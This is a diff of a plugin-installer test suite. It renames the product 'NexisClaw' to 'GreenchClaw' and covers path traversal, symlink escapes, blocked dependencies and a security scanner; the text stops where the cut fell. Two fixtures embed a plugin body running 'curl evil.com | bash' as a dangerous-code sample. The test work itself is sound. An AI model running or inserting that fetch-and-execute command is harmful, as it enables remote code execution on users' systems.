@@ -2,8 +2,8 @@ import fs from "node:fs";
 import path from "node:path";
 import * as tar from "tar";
 import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
+import { resolveGreenchClawPackageRootSync } from "../infra/GreenchClaw-root.js";
 import { safePathSegmentHashed } from "../infra/install-safe-path.js";
-import { resolveNexisClawPackageRootSync } from "../infra/NexisClaw-root.js";
 import { runCommandWithTimeout } from "../process/exec.js";
 import { initializeGlobalHookRunner, resetGlobalHookRunner } from "./hook-runner-global.js";
 import { createMockPluginRegistry } from "./hooks.test-helpers.js";
@@ -20,8 +20,8 @@ vi.mock("../process/exec.js", () => ({
   runCommandWithTimeout: vi.fn(),
 }));
 
-vi.mock("../infra/NexisClaw-root.js", () => ({
-  resolveNexisClawPackageRootSync: vi.fn(),
+vi.mock("../infra/GreenchClaw-root.js", () => ({
+  resolveGreenchClawPackageRootSync: vi.fn(),
 }));
 
 const resolveCompatibilityHostVersionMock = vi.fn();
@@ -51,7 +51,7 @@ const archiveFixturePathCache = new Map<string, string>();
 const dynamicArchiveTemplatePathCache = new Map<string, string>();
 let installPluginFromDirTemplateDir = "";
 let manifestInstallTemplateDir = "";
-const suiteTempRootTracker = createSuiteTempRootTracker("NexisClaw-plugin-install");
+const suiteTempRootTracker = createSuiteTempRootTracker("GreenchClaw-plugin-install");
 const DYNAMIC_ARCHIVE_TEMPLATE_PRESETS = [
   {
     outName: "traversal.tgz",
@@ -59,7 +59,7 @@ const DYNAMIC_ARCHIVE_TEMPLATE_PRESETS = [
     packageJson: {
       name: "@evil/..",
       version: "0.0.1",
-      NexisClaw: { extensions: ["./dist/index.js"] },
+      GreenchClaw: { extensions: ["./dist/index.js"] },
     } as Record<string, unknown>,
   },
   {
@@ -68,14 +68,14 @@ const DYNAMIC_ARCHIVE_TEMPLATE_PRESETS = [
     packageJson: {
       name: "@evil/.",
       version: "0.0.1",
-      NexisClaw: { extensions: ["./dist/index.js"] },
+      GreenchClaw: { extensions: ["./dist/index.js"] },
     } as Record<string, unknown>,
   },
   {
     outName: "bad.tgz",
     withDistIndex: false,
     packageJson: {
-      name: "@NexisClaw/nope",
+      name: "@GreenchClaw/nope",
       version: "0.0.1",
     } as Record<string, unknown>,
   },
@@ -172,7 +172,7 @@ function writeMinimalPackagePlugin(pluginDir: string, name: string): void {
     JSON.stringify({
       name,
       version: "1.0.0",
-      NexisClaw: { extensions: ["index.js"] },
+      GreenchClaw: { extensions: ["index.js"] },
     }),
   );
   fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -266,7 +266,7 @@ function setupManifestInstallFixture(params: { manifestId: string; packageName?:
     fs.writeFileSync(packageJsonPath, JSON.stringify(manifest), "utf-8");
   }
   fs.writeFileSync(
-    path.join(pluginDir, "NexisClaw.plugin.json"),
+    path.join(pluginDir, "GreenchClaw.plugin.json"),
     JSON.stringify({
       id: params.manifestId,
       configSchema: { type: "object", properties: {} },
@@ -279,12 +279,12 @@ function setupManifestInstallFixture(params: { manifestId: string; packageName?:
 function setPluginMinHostVersion(pluginDir: string, minHostVersion: string) {
   const packageJsonPath = path.join(pluginDir, "package.json");
   const manifest = JSON.parse(fs.readFileSync(packageJsonPath, "utf-8")) as {
-    NexisClaw?: { install?: Record<string, unknown> };
+    GreenchClaw?: { install?: Record<string, unknown> };
   };
-  manifest.NexisClaw = {
-    ...manifest.NexisClaw,
+  manifest.GreenchClaw = {
+    ...manifest.GreenchClaw,
     install: {
-      ...manifest.NexisClaw?.install,
+      ...manifest.GreenchClaw?.install,
       minHostVersion,
     },
   };
@@ -426,15 +426,15 @@ function setupDualFormatInstallFixture(params: { bundleFormat: "codex" | "claude
   fs.writeFileSync(
     path.join(pluginDir, "package.json"),
     JSON.stringify({
-      name: "@NexisClaw/native-dual",
+      name: "@GreenchClaw/native-dual",
       version: "0.0.1",
-      NexisClaw: { extensions: ["./dist/index.js"] },
+      GreenchClaw: { extensions: ["./dist/index.js"] },
       dependencies: { "left-pad": "1.3.0" },
     }),
     "utf-8",
   );
   fs.writeFileSync(
-    path.join(pluginDir, "NexisClaw.plugin.json"),
+    path.join(pluginDir, "GreenchClaw.plugin.json"),
     JSON.stringify({
       id: "native-dual",
       configSchema: { type: "object", properties: {} },
@@ -463,7 +463,7 @@ async function expectArchiveInstallReservedSegmentRejection(params: {
     packageJson: {
       name: params.packageName,
       version: "0.0.1",
-      NexisClaw: { extensions: ["./dist/index.js"] },
+      GreenchClaw: { extensions: ["./dist/index.js"] },
     },
     outName: params.outName,
     withDistIndex: true,
@@ -557,7 +557,7 @@ async function ensureDynamicArchiveTemplate(params: {
     const packageName =
       typeof params.packageJson.name === "string" ? params.packageJson.name : "fixture-plugin";
     fs.writeFileSync(
-      path.join(pkgDir, "NexisClaw.plugin.json"),
+      path.join(pkgDir, "GreenchClaw.plugin.json"),
       JSON.stringify({
         id: params.manifestId ?? packageName,
         configSchema: { type: "object", properties: {} },
@@ -590,9 +590,9 @@ beforeAll(async () => {
   fs.writeFileSync(
     path.join(installPluginFromDirTemplateDir, "package.json"),
     JSON.stringify({
-      name: "@NexisClaw/test-plugin",
+      name: "@GreenchClaw/test-plugin",
       version: "0.0.1",
-      NexisClaw: { extensions: ["./dist/index.js"] },
+      GreenchClaw: { extensions: ["./dist/index.js"] },
       dependencies: { "left-pad": "1.3.0" },
     }),
     "utf-8",
@@ -608,9 +608,9 @@ beforeAll(async () => {
   fs.writeFileSync(
     path.join(manifestInstallTemplateDir, "package.json"),
     JSON.stringify({
-      name: "@NexisClaw/cognee-NexisClaw",
+      name: "@GreenchClaw/cognee-GreenchClaw",
       version: "0.0.1",
-      NexisClaw: { extensions: ["./dist/index.js"] },
+      GreenchClaw: { extensions: ["./dist/index.js"] },
     }),
     "utf-8",
   );
@@ -620,7 +620,7 @@ beforeAll(async () => {
     "utf-8",
   );
   fs.writeFileSync(
-    path.join(manifestInstallTemplateDir, "NexisClaw.plugin.json"),
+    path.join(manifestInstallTemplateDir, "GreenchClaw.plugin.json"),
     JSON.stringify({
       id: "manifest-template",
       configSchema: { type: "object", properties: {} },
@@ -656,7 +656,7 @@ describe("installPluginFromArchive", () => {
       packageJson: {
         name: "archive-with-deps",
         version: "0.0.1",
-        NexisClaw: { extensions: ["./dist/index.js"] },
+        GreenchClaw: { extensions: ["./dist/index.js"] },
         dependencies: { "left-pad": "1.3.0" },
       },
       outName: "archive-with-deps.tgz",
@@ -671,7 +671,7 @@ describe("installPluginFromArchive", () => {
     if (!commandOptions || typeof commandOptions === "number") {
       throw new Error("expected command options object");
     }
-    expect(commandOptions.cwd).toContain(".NexisClaw-install-stage-");
+    expect(commandOptions.cwd).toContain(".GreenchClaw-install-stage-");
   });
 
   it("installs scoped archives, rejects duplicate installs, and allows updates", async () => {
@@ -679,18 +679,18 @@ describe("installPluginFromArchive", () => {
     const archiveV1 = await ensureDynamicArchiveTemplate({
       outName: "voice-call-0.0.1.tgz",
       packageJson: {
-        name: "@NexisClaw/voice-call",
+        name: "@GreenchClaw/voice-call",
         version: "0.0.1",
-        NexisClaw: { extensions: ["./dist/index.js"] },
+        GreenchClaw: { extensions: ["./dist/index.js"] },
       },
       withDistIndex: true,
     });
     const archiveV2 = await ensureDynamicArchiveTemplate({
       outName: "voice-call-0.0.2.tgz",
       packageJson: {
-        name: "@NexisClaw/voice-call",
+        name: "@GreenchClaw/voice-call",
         version: "0.0.2",
-        NexisClaw: { extensions: ["./dist/index.js"] },
+        GreenchClaw: { extensions: ["./dist/index.js"] },
       },
       withDistIndex: true,
     });
@@ -700,7 +700,11 @@ describe("installPluginFromArchive", () => {
       archivePath: archiveV1,
       extensionsDir,
     });
-    expectSuccessfulArchiveInstall({ result: first, stateDir, pluginId: "@NexisClaw/voice-call" });
+    expectSuccessfulArchiveInstall({
+      result: first,
+      stateDir,
+      pluginId: "@GreenchClaw/voice-call",
+    });
 
     const duplicate = await installPluginFromArchive({
       archivePath: archiveV1,
@@ -726,7 +730,7 @@ describe("installPluginFromArchive", () => {
     expect(manifest.version).toBe("0.0.2");
   });
 
-  it("rejects native plugin zip archives without NexisClaw.plugin.json", async () => {
+  it("rejects native plugin zip archives without GreenchClaw.plugin.json", async () => {
     const stateDir = suiteTempRootTracker.makeTempDir();
     const archivePath = getArchiveFixturePath({
       cacheKey: "zipper:0.0.1",
@@ -741,10 +745,12 @@ describe("installPluginFromArchive", () => {
     });
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.error).toContain("package missing valid NexisClaw.plugin.json");
+      expect(result.error).toContain("package missing valid GreenchClaw.plugin.json");
       expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_PLUGIN_MANIFEST);
     }
-    expect(fs.existsSync(resolvePluginInstallDir("@NexisClaw/zipper", extensionsDir))).toBe(false);
+    expect(fs.existsSync(resolvePluginInstallDir("@GreenchClaw/zipper", extensionsDir))).toBe(
+      false,
+    );
   });
 
   it("allows archive installs with dangerous code patterns when forced unsafe install is set", async () => {
@@ -757,7 +763,7 @@ describe("installPluginFromArchive", () => {
       packageJson: {
         name: "dangerous-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["./dist/index.js"] },
+        GreenchClaw: { extensions: ["./dist/index.js"] },
       },
       withDistIndex: true,
       distIndexJsContent: `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
@@ -789,7 +795,7 @@ describe("installPluginFromArchive", () => {
       packageJson: {
         name: "official-dangerous-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["./dist/index.js"] },
+        GreenchClaw: { extensions: ["./dist/index.js"] },
       },
       withDistIndex: true,
       distIndexJsContent: `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
@@ -808,9 +814,9 @@ describe("installPluginFromArchive", () => {
   it("installs flat-root plugin archives from ClawHub-style downloads", async () => {
     const result = await installArchivePackageAndReturnResult({
       packageJson: {
-        name: "@NexisClaw/rootless",
+        name: "@GreenchClaw/rootless",
         version: "0.0.1",
-        NexisClaw: { extensions: ["./dist/index.js"] },
+        GreenchClaw: { extensions: ["./dist/index.js"] },
       },
       outName: "rootless-plugin.tgz",
       withDistIndex: true,
@@ -834,31 +840,31 @@ describe("installPluginFromArchive", () => {
     }
   });
 
-  it("rejects packages without NexisClaw.extensions", async () => {
+  it("rejects packages without GreenchClaw.extensions", async () => {
     const result = await installArchivePackageAndReturnResult({
-      packageJson: { name: "@NexisClaw/nope", version: "0.0.1" },
+      packageJson: { name: "@GreenchClaw/nope", version: "0.0.1" },
       outName: "bad.tgz",
     });
     expect(result.ok).toBe(false);
     if (result.ok) {
       return;
     }
-    expect(result.error).toContain("NexisClaw.extensions");
-    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_NEXISCLAW_EXTENSIONS);
+    expect(result.error).toContain("GreenchClaw.extensions");
+    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_GREENCHCLAW_EXTENSIONS);
   });
 
-  it("rejects legacy plugin package shape when NexisClaw.extensions is missing", async () => {
+  it("rejects legacy plugin package shape when GreenchClaw.extensions is missing", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.writeFileSync(
       path.join(pluginDir, "package.json"),
       JSON.stringify({
-        name: "@NexisClaw/legacy-entry-fallback",
+        name: "@GreenchClaw/legacy-entry-fallback",
         version: "0.0.1",
       }),
       "utf-8",
     );
     fs.writeFileSync(
-      path.join(pluginDir, "NexisClaw.plugin.json"),
+      path.join(pluginDir, "GreenchClaw.plugin.json"),
       JSON.stringify({
         id: "legacy-entry-fallback",
         configSchema: { type: "object", properties: {} },
@@ -874,15 +880,15 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.error).toContain("package.json missing NexisClaw.extensions");
+      expect(result.error).toContain("package.json missing GreenchClaw.extensions");
       expect(result.error).toContain("update the plugin package");
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_NEXISCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_GREENCHCLAW_EXTENSIONS);
       return;
     }
-    expect.unreachable("expected install to fail without NexisClaw.extensions");
+    expect.unreachable("expected install to fail without GreenchClaw.extensions");
   });
 
-  it("rejects package installs when NexisClaw.extensions entries escape the package", async () => {
+  it("rejects package installs when GreenchClaw.extensions entries escape the package", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.mkdirSync(path.join(pluginDir, "dist"), { recursive: true });
     fs.writeFileSync(
@@ -890,7 +896,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "escaping-entry-plugin",
         version: "1.0.0",
-        NexisClaw: {
+        GreenchClaw: {
           extensions: ["../src/index.ts"],
           runtimeExtensions: ["./dist/index.js"],
         },
@@ -905,7 +911,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_NEXISCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_GREENCHCLAW_EXTENSIONS);
       expect(result.error).toContain("extension entry escapes plugin directory");
     }
   });
@@ -917,7 +923,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "missing-entry-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["./dist/index.js"] },
+        GreenchClaw: { extensions: ["./dist/index.js"] },
       }),
     );
 
@@ -928,7 +934,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_NEXISCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_GREENCHCLAW_EXTENSIONS);
       expect(result.error).toContain("extension entry not found");
     }
   });
@@ -941,7 +947,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "inferred-runtime-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["./src/index.ts"] },
+        GreenchClaw: { extensions: ["./src/index.ts"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "dist", "index.js"), "export {};\n");
@@ -965,7 +971,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "source-only-runtime-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["./src/index.ts"] },
+        GreenchClaw: { extensions: ["./src/index.ts"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "src", "index.ts"), "export {};\n");
@@ -977,7 +983,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_NEXISCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_GREENCHCLAW_EXTENSIONS);
       expect(result.error).toContain("requires compiled runtime output");
       expect(result.error).toContain("./dist/index.js");
       expect(result.error).toContain("plugin packaging issue");
@@ -993,7 +999,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "runtime-mismatch-plugin",
         version: "1.0.0",
-        NexisClaw: {
+        GreenchClaw: {
           extensions: ["./src/one.ts", "./src/two.ts"],
           runtimeExtensions: ["./dist/one.js"],
         },
@@ -1008,7 +1014,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_NEXISCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_GREENCHCLAW_EXTENSIONS);
       expect(result.error).toContain("runtimeExtensions length (1)");
       expect(result.error).toContain("extensions length (2)");
     }
@@ -1023,7 +1029,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "runtime-blank-plugin",
         version: "1.0.0",
-        NexisClaw: {
+        GreenchClaw: {
           extensions: ["./src/index.ts"],
           runtimeExtensions: [" "],
         },
@@ -1039,8 +1045,8 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_NEXISCLAW_EXTENSIONS);
-      expect(result.error).toContain("NexisClaw.runtimeExtensions[0]");
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_GREENCHCLAW_EXTENSIONS);
+      expect(result.error).toContain("GreenchClaw.runtimeExtensions[0]");
       expect(result.error).toContain("non-empty string");
     }
   });
@@ -1054,7 +1060,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "missing-runtime-setup-plugin",
         version: "1.0.0",
-        NexisClaw: {
+        GreenchClaw: {
           extensions: ["./dist/index.js"],
           setupEntry: "./src/setup-entry.ts",
           runtimeSetupEntry: "./dist/setup-entry.js",
@@ -1071,7 +1077,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_NEXISCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_GREENCHCLAW_EXTENSIONS);
       expect(result.error).toContain("runtime setup entry not found");
       expect(result.error).toContain("./dist/setup-entry.js");
     }
@@ -1094,7 +1100,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "symlink-entry-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["./linked/escape.js"] },
+        GreenchClaw: { extensions: ["./linked/escape.js"] },
       }),
     );
 
@@ -1105,7 +1111,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_NEXISCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_GREENCHCLAW_EXTENSIONS);
       expect(result.error).toContain("extension entry");
     }
   });
@@ -1133,7 +1139,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hardlink-entry-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["./escape.js"] },
+        GreenchClaw: { extensions: ["./escape.js"] },
       }),
     );
 
@@ -1144,7 +1150,7 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_NEXISCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_GREENCHCLAW_EXTENSIONS);
       expect(result.error).toContain("boundary checks");
     }
   });
@@ -1157,7 +1163,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -1184,7 +1190,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "test-pattern-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1208,7 +1214,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "test-entry-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["tests/runtime.test.js"] },
+        GreenchClaw: { extensions: ["tests/runtime.test.js"] },
       }),
     );
     fs.mkdirSync(path.join(pluginDir, "tests"), { recursive: true });
@@ -1234,7 +1240,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-dependency-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
         dependencies: {
           "plain-crypto-js": "^4.2.1",
         },
@@ -1264,7 +1270,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "aliased-blocked-dependency-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
         dependencies: {
           "safe-name": "npm:plain-crypto-js@^4.2.1",
         },
@@ -1292,7 +1298,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "override-aliased-blocked-dependency-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
         overrides: {
           "@scope/parent": {
             "safe-name": "npm:plain-crypto-js@^4.2.1",
@@ -1324,7 +1330,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "vendored-blocked-dependency-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1358,7 +1364,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-package-dir-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1385,7 +1391,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-package-file-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1412,7 +1418,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-package-extensionless-file-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1441,7 +1447,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-symlink-plugin",
           version: "1.0.0",
-          NexisClaw: { extensions: ["index.js"] },
+          GreenchClaw: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1475,7 +1481,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-symlink-target-plugin",
           version: "1.0.0",
-          NexisClaw: { extensions: ["index.js"] },
+          GreenchClaw: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1509,7 +1515,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-file-symlink-target-plugin",
           version: "1.0.0",
-          NexisClaw: { extensions: ["index.js"] },
+          GreenchClaw: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1545,7 +1551,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-nested-file-symlink-target-plugin",
           version: "1.0.0",
-          NexisClaw: { extensions: ["index.js"] },
+          GreenchClaw: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1583,7 +1589,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "allowed-scoped-symlink-target-plugin",
           version: "1.0.0",
-          NexisClaw: { extensions: ["index.js"] },
+          GreenchClaw: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1612,7 +1618,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "outside-root-symlink-plugin",
           version: "1.0.0",
-          NexisClaw: { extensions: ["index.js"] },
+          GreenchClaw: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1636,18 +1642,18 @@ describe("installPluginFromArchive", () => {
   );
 
   it.runIf(process.platform !== "win32")(
-    "allows package installs when node_modules/NexisClaw points at the host package root",
+    "allows package installs when node_modules/GreenchClaw points at the host package root",
     async () => {
       const { pluginDir, extensionsDir, tmpDir } = setupPluginInstallDirs();
-      const hostRoot = path.join(tmpDir, "host-NexisClaw");
+      const hostRoot = path.join(tmpDir, "host-GreenchClaw");
       fs.mkdirSync(hostRoot, { recursive: true });
-      fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"NexisClaw"}\n');
-      vi.mocked(resolveNexisClawPackageRootSync).mockReturnValue(hostRoot);
-      writeMinimalPackagePlugin(pluginDir, "NexisClaw-peer-plugin");
+      fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"GreenchClaw"}\n');
+      vi.mocked(resolveGreenchClawPackageRootSync).mockReturnValue(hostRoot);
+      writeMinimalPackagePlugin(pluginDir, "GreenchClaw-peer-plugin");
 
       const nodeModulesDir = path.join(pluginDir, "node_modules");
       fs.mkdirSync(nodeModulesDir, { recursive: true });
-      fs.symlinkSync(hostRoot, path.join(nodeModulesDir, "NexisClaw"), "junction");
+      fs.symlinkSync(hostRoot, path.join(nodeModulesDir, "GreenchClaw"), "junction");
 
       const { result } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
 
@@ -1656,20 +1662,20 @@ describe("installPluginFromArchive", () => {
   );
 
   it.runIf(process.platform !== "win32")(
-    "allows package installs when node_modules/.bin/NexisClaw points inside the host package root",
+    "allows package installs when node_modules/.bin/GreenchClaw points inside the host package root",
     async () => {
       const { pluginDir, extensionsDir, tmpDir } = setupPluginInstallDirs();
-      const hostRoot = path.join(tmpDir, "host-NexisClaw");
+      const hostRoot = path.join(tmpDir, "host-GreenchClaw");
       fs.mkdirSync(hostRoot, { recursive: true });
-      fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"NexisClaw"}\n');
-      const hostBin = path.join(hostRoot, "NexisClaw.mjs");
+      fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"GreenchClaw"}\n');
+      const hostBin = path.join(hostRoot, "GreenchClaw.mjs");
       fs.writeFileSync(hostBin, "#!/usr/bin/env node\n");
-      vi.mocked(resolveNexisClawPackageRootSync).mockReturnValue(hostRoot);
-      writeMinimalPackagePlugin(pluginDir, "NexisClaw-bin-peer-plugin");
+      vi.mocked(resolveGreenchClawPackageRootSync).mockReturnValue(hostRoot);
+      writeMinimalPackagePlugin(pluginDir, "GreenchClaw-bin-peer-plugin");
 
       const binDir = path.join(pluginDir, "node_modules", ".bin");
       fs.mkdirSync(binDir, { recursive: true });
-      fs.symlinkSync(hostBin, path.join(binDir, "NexisClaw"), "file");
+      fs.symlinkSync(hostBin, path.join(binDir, "GreenchClaw"), "file");
 
       const { result } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
 
@@ -1678,56 +1684,56 @@ describe("installPluginFromArchive", () => {
   );
 
   it.runIf(process.platform !== "win32")(
-    "fails package installs when node_modules/NexisClaw points outside the host package root",
+    "fails package installs when node_modules/GreenchClaw points outside the host package root",
     async () => {
       const { pluginDir, extensionsDir, tmpDir } = setupPluginInstallDirs();
-      const hostRoot = path.join(tmpDir, "host-NexisClaw");
-      const spoofedRoot = path.join(tmpDir, "spoofed-NexisClaw");
+      const hostRoot = path.join(tmpDir, "host-GreenchClaw");
+      const spoofedRoot = path.join(tmpDir, "spoofed-GreenchClaw");
       fs.mkdirSync(hostRoot, { recursive: true });
       fs.mkdirSync(spoofedRoot, { recursive: true });
-      fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"NexisClaw"}\n');
-      fs.writeFileSync(path.join(spoofedRoot, "package.json"), '{"name":"NexisClaw"}\n');
-      vi.mocked(resolveNexisClawPackageRootSync).mockReturnValue(hostRoot);
-      writeMinimalPackagePlugin(pluginDir, "spoofed-NexisClaw-peer-plugin");
+      fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"GreenchClaw"}\n');
+      fs.writeFileSync(path.join(spoofedRoot, "package.json"), '{"name":"GreenchClaw"}\n');
+      vi.mocked(resolveGreenchClawPackageRootSync).mockReturnValue(hostRoot);
+      writeMinimalPackagePlugin(pluginDir, "spoofed-GreenchClaw-peer-plugin");
 
       const nodeModulesDir = path.join(pluginDir, "node_modules");
       fs.mkdirSync(nodeModulesDir, { recursive: true });
-      fs.symlinkSync(spoofedRoot, path.join(nodeModulesDir, "NexisClaw"), "junction");
+      fs.symlinkSync(spoofedRoot, path.join(nodeModulesDir, "GreenchClaw"), "junction");
 
       const { result } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
 
       expect(result.ok).toBe(false);
       if (!result.ok) {
         expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.SECURITY_SCAN_FAILED);
-        expect(result.error).toContain("node_modules/NexisClaw");
+        expect(result.error).toContain("node_modules/GreenchClaw");
       }
     },
   );
 
   it.runIf(process.platform !== "win32")(
-    "fails package installs for nested or non-exact NexisClaw node_modules symlinks",
+    "fails package installs for nested or non-exact GreenchClaw node_modules symlinks",
     async () => {
       const cases = [
         {
-          pluginName: "nested-NexisClaw-peer-plugin",
-          relativePath: path.join("node_modules", "vendor", "node_modules", "NexisClaw"),
+          pluginName: "nested-GreenchClaw-peer-plugin",
+          relativePath: path.join("node_modules", "vendor", "node_modules", "GreenchClaw"),
         },
         {
-          pluginName: "uppercase-NexisClaw-peer-plugin",
-          relativePath: path.join("node_modules", "NexisClaw"),
+          pluginName: "uppercase-GreenchClaw-peer-plugin",
+          relativePath: path.join("node_modules", "GreenchClaw"),
         },
         {
-          pluginName: "trailing-space-NexisClaw-peer-plugin",
-          relativePath: path.join("node_modules", "NexisClaw "),
